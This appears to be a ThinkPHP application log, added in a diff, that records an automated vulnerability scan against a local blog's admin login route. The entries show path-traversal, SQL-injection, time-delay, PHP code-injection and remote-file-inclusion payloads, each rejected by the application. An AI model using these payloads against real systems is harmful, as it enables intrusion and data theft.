+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=/.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000708s ]
+ERR: 无法加载模块:/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m[]=
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000578s ]
+NOTIC: [2] ucfirst() expects parameter 1 to be string, array given D:\phpStudy\WWW\TPblog\ThinkPHP\Library\Think\Dispatcher.class.php 第 336 行.
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000671s ]
+ERR: 无法加载模块:../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000635s ]
+ERR: 无法加载模块:../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000773s ]
+ERR: 无法加载模块:Unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=WEB-INF/web.xml
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000847s ]
+ERR: 无法加载模块:WEB-INF/web.xml
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=WEB-INF%5cweb.xml
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000698s ]
+ERR: 无法加载模块:WEB-INF\web.xml
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=%26n931869=v906692
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000854s ]
+ERR: 无法加载模块:&n931869=v906692
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000598s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002255s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000674s ]
+ERR: 无法加载模块:)
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=aqYGqc7E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000626s ]
+ERR: 无法加载模块:AqYGqc7E
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=!(()%26%26!%7c*%7c*%7c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000683s ]
+ERR: 无法加载模块:!(()&&!|*|*|
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000744s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=%5e(%23%24!%40%23%24)(()))******
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000770s ]
+ERR: 无法加载模块:^(#$!@#$)(()))******
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000684s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000617s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000715s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%202%2b901-901-1=0%2b0%2b0%2b1%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001309s ]
+ERR: 无法加载模块:-1 OR 2+901-901-1=0+0+0+1 -- 
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m[$acunetix]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000060s ]
+INFO: [ app_init ] --END-- [ RunTime:0.005158s ]
+NOTIC: [2] ucfirst() expects parameter 1 to be string, array given D:\phpStudy\WWW\TPblog\ThinkPHP\Library\Think\Dispatcher.class.php 第 336 行.
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203%2b901-901-1=0%2b0%2b0%2b1%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000860s ]
+ERR: 无法加载模块:-1 OR 3+901-901-1=0+0+0+1 -- 
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m='"()
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000581s ]
+ERR: 无法加载模块:'"()
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2<(0%2b5%2b901-901)%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003208s ]
+ERR: 无法加载模块:-1 OR 3*2
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2>(0%2b5%2b901-901)%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000625s ]
+ERR: 无法加载模块:-1 OR 3*2>(0+5+901-901) -- 
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%202%2b730-730-1=0%2b0%2b0%2b1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000629s ]
+ERR: 无法加载模块:-1 OR 2+730-730-1=0+0+0+1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203%2b730-730-1=0%2b0%2b0%2b1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000614s ]
+ERR: 无法加载模块:-1 OR 3+730-730-1=0+0+0+1
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2<(0%2b5%2b730-730)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000624s ]
+ERR: 无法加载模块:-1 OR 3*2
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2>(0%2b5%2b730-730)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000675s ]
+ERR: 无法加载模块:-1 OR 3*2>(0+5+730-730)
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=if(now()=sysdate()%2csleep(6)%2c0)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000898s ]
+ERR: 无法加载模块:If(now()=sysdate(),sleep(6),0)
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000601s ]
+ERR: 无法加载模块:0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=0"XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR"Z
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000644s ]
+ERR: 无法加载模块:0"XOR(if(now()=sysdate(),sleep(6),0))XOR"Z
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{9999102%2b9999780}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000716s ]
+ERR: 无法加载模块:${9999102+9999780}
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'"%2b(select(0)from(select(sleep(6)))v)%2b"*/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000626s ]
+ERR: 无法加载模块:(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+
+[ 2017-11-18T19:59:27+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1;%20waitfor%20delay%20'0:0:6'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000935s ]
+ERR: 无法加载模块:-1; waitfor delay '0:0:6' -- 
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=;print(md5(acunetix_wvs_security_test));
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000615s ]
+ERR: 无法加载模块:;print(md5(acunetix_wvs_security_test));
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=';print(md5(acunetix_wvs_security_test));%24a='
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000602s ]
+ERR: 无法加载模块:';print(md5(acunetix_wvs_security_test));$a='
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=HttP://testasp.vulnweb.com/t/xss.html%3f%2500
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000604s ]
+ERR: 无法加载模块:HttP://testasp.vulnweb.com/t/xss.html?%00
+
